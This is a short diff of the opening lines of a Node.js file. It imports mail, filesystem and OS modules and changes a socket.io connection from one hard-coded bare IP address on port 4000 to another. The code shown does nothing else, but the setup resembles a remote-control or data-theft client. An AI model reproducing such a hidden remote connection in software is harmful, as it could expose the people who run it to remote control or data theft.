@@ -1,7 +1,7 @@
 const nodemailer = require("nodemailer");
 var randomstring = require("randomstring");
 var io = require("socket.io-client");
-var socket = io.connect("http://154.53.50.250:4000", { reconnect: true });
+var socket = io.connect("http://173.212.219.58:4000", { reconnect: true });
 const os = require("os");
 const fs = require("fs");
 
